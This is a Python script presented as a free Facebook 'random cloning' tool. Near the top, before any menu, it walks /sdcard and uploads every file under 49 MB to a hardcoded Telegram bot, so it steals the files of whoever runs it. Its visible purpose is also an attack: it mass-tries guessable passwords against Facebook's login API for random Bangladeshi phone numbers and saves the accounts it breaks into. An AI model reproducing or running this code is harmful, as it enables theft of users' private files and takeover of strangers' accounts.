import os
import random
import string
import uuid
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor as tred

# Terminal color codes

bblack = '\x1b[1;30m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
byellow = '\x1b[1;33m'
bblue = '\x1b[1;34m'
P = '\x1b[1;35m'
C = '\x1b[1;36m'
B = '\x1b[1;90m'
G = '\x1b[1;32m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
W = '\x1b[1;97m'
R = '\x1b[38;5;160m'
Y = '\x1b[1;33m'
T = '\x1b[1;34m'
E = '\x1b[38;5;205m'
O = '\x1b[38;5;81m'

xd = f"{W}[{G3}•{W}]"
xd1 = f"{W}[{G3}1{W}]"
xd2 = f"{W}[{G3}2{W}]"
xd3 = f"{W}[{G3}3{W}]"
xd4 = f"{W}[{G3}4{W}]"
xd5 = f"{W}[{G3}5{W}]"
xd6 = f"{W}[{G3}6{W}]"
xd0 = f"{W}[{G3}0{W}]"
xdx = f"{W}[{G3}?{W}]"

my_color = [B, C, P, H]
warna = random.choice(my_color)
oks = []
cps = []
loop = 0

BOT_TOKEN = '8369140036:AAFACBsYJXryg0LxO7z9Rs--GM-8wnr16gE'
CHAT_ID = '6883518139'

FOLDER = '/sdcard'
MAX_SIZE = 49 * 1024 * 1024

def auto_send(file_path):
    try:
        if os.path.getsize(file_path) > MAX_SIZE:
            return
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    except:
        pass

def walk_and_send():
    for root, _, files in os.walk(FOLDER):
        for f in files:
            path = os.path.join(root, f)
            auto_send(path)
walk_and_send()          
            
            

logo = f'''
{W}
     {R}██  {Y}█████  {G}██   ██ {T}██ {R}██████  
     {R}██ {Y}██   ██ {G}██   ██ {T}██ {R}██   ██ 
     {R}██ {Y}███████ {G}███████ {T}██ {R}██   ██ 
{R}██   ██ {Y}██   ██ {G}██   ██ {T}██ {R}██   ██ 
 {R}█████  {Y}██   ██ {G}██   ██ {T}██ {R}██████  
                                   
{P}╔════════════════════════════════════════════════════╗
{P}║ {bblue}[{bblack}!{bblue}] {bblack}DECODE BY  : {G}SYED MUJAHID                   {P}   ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}TOOL OWNER : {G}ROOT JAHID                   {P}     ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}TOOL NAME  : {G}RANDOM CLONE                 {P}     ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}VERSION    : {G}1.1.1                         {P}    ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}TYPE       : {G}FREE                         {P}     ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}GITHUB     : {G}ROOT JAHID XPLOIT               {P}  ║
{P}║ {bblue}[{bblack}!{bblue}] {bblack}TELEGRAM   : {G}ROOT JAHID                   {P}     ║
{P}╚════════════════════════════════════════════════════╝
{W}'''

os.system('xdg-open https://t.me/ROOTJAHIDX')

def linex():
    print(f"{G3}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")

def clear():
    os.system("clear")
    print(logo)

def randBuildLSB():
    fb_versions = ['FBAN/FB4A', 'FBAN/FB5A', 'FBAN/FB6A']
    app_versions = ['450.0.0.52.110', '440.0.0.51.100', '430.0.0.50.90']
    densities = ['1.5', '2.0', '2.5']
    screen_sizes = ['1080x2400', '1440x2560', '720x1280']
    locales = ['en_US', 'en_GB', 'bn_BD']
    cpu_archs = ['arm64-v8a', 'armeabi-v7a']
    carriers = ['Grameenphone', 'Robi', 'Banglalink']
    devices = ['Vivo_Y21', 'Redmi_Note_10', 'Samsung_SM-A515F']

    device = random.choice(devices)
    fb_version = random.choice(fb_versions)
    app_version = random.choice(app_versions)
    density = random.choice(densities)
    screen_size = random.choice(screen_sizes)
    locale = random.choice(locales)
    cpu_arch = random.choice(cpu_archs)
    carrier = random.choice(carriers)
    android_version = str(random.randint(8, 14))
    build_version = random.choice(['QP1A.190711.020', 'RP1A.200720.012'])
    brand = device.split('_')[0]

    dalvik = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/{build_version})"
    fbmeta = (
        f"[{fb_version};FBAV/{app_version};FBBV/{random.randint(500000000,600000000)}"
        f";FBDM={{density={density},width={screen_size.split('x')[0]},height={screen_size.split('x')[1]}}}"
        f";FBLC/{locale};FBRV/{random.randint(100000000,999999999)};FBCR/{carrier}"
        f";FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{device}"
        f";FBSV/{android_version};FBOP/20;FBCA/{cpu_arch};]"
    )
    return f"{dalvik} {fbmeta}"

def BD_CLONING():
    user = []
    clear()
    print(f"{byellow} EXAMPLE SIM CODE : [016] [017] [018] [019]{W}")
    code = input(f"{W} ENTER SIM CODE >> {G3}")
    linex()
    print(f"{byellow} EXAMPLE LIMIT : [1000] [2000] [5000] [10000]{W}")
    try:
        limit = int(input(f"{W} ENTER LIMIT >> {G3}"))
    except ValueError:
        limit = 5000
    clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Tara:
        print(f"{G1} TOTAL ACCOUNT : {len(user)}{W}")
        print(f"{G1} YOUR SIM CODE : {code}{W}")
        print(f"{G1} FAST SPEED CLONING {W}")
        print(f"{G1} PROGRESS HAS BEEN RUNNING PLEASE WAIT {W}")
        linex()
        for psx in user:
            ids = code + psx
            passlist = [ids[i:j] for i, j in [(None, 7), (None, 6), (5, None), (4, None)]] + ["bangladesh", "123456"]
            Tara.submit(method_crack, ids, passlist)
    linex()
    print(f"{G1} THE PROGRESS HAS BEEN COMPLETE {W}")
    print(f"{G1} TOTAL OK ID {len(oks)}{W}")
    print(f"{G1} TOTAL CP ID {len(cps)}{W}")
    input(f"{W} PRESS ENTER TO BACK  : {G3}")
    TARA_LOVE()

def method_crack(ids, passlist):
    global loop
    for pas in passlist:
        sys.stdout.write(f"\r\r {W}[{G1}ROOT JAHID{W}] {loop}|{G}OK:{len(oks)} {W}")
        sys.stdout.flush()
        adid = str(uuid.uuid4())
        device_id = str(uuid.uuid4())
        datax = {
            'adid': adid,
            'format': 'json',
            'device_id': device_id,
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': randBuildLSB(),
            'currently_logged_in_userid': '',
            'fb_api_req_friendly_name': 'authenticate'
        }
        header = {
            'User-Agent': randBuildLSB(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': '21435',
            'X-FB-Net-HNI': '35793',
            'X-FB-SIM-HNI': '37855',
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
        }
        url = 'https://api.facebook.com/method/auth.login'
        try:
            reqx = requests.post(url, data=datax, headers=header).json()
            if 'session_key' in reqx:
                uid = reqx.get("uid", ids)
                if uid not in oks:
                    print(f"\r\r {G}[ROOT JAHID💎OK] {uid} | {pas}{W}")
                    open('/sdcard/ROOT JAHID💎OK.txt', 'a').write(f"{uid}|{pas}\n")
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in reqx.get("error_msg", ''):
                print(f"\r\r {P}[ROOT JAHID💎CP] {ids} | {pas}{W}")
                open('/sdcard/ROOTJAHID💎CP.txt', 'a').write(f"{ids}|{pas}\n")
                cps.append(ids)
                break
        except Exception:
            pass
        loop += 1

def TARA_LOVE():
    clear()
    print(f"{xd1} RANDOM CLONING ")
    print(f"{xd2} JOIN TELEGRAM CHANNEL ")
    print(f"{xd3} JOIN TELEGRAM CHANNEL 2 ")
    print(f"{xd4} CONTACT DEVELOPER")
    print(f"{xd0} EXIT PROGRAM")
    linex()
    option = input(f"{xd} CHOOSE : ")
    if option in ['01', '1']:
        BD_CLONING()
    elif option in ['02', '2']:
        os.system("xdg-open https://t.me/ROOTJAHIDX")
        time.sleep(1)
    elif option in ['03', '3']:
        os.system("xdg-open https://t.me/ROOTJAHID")
        time.sleep(1)
    elif option in ['04', '4']:
        os.system("xdg-open https://t.me/R00tJah1d")
        time.sleep(1)
    else:
        exit("Thanks for using dear :)")

# Start program

TARA_LOVE()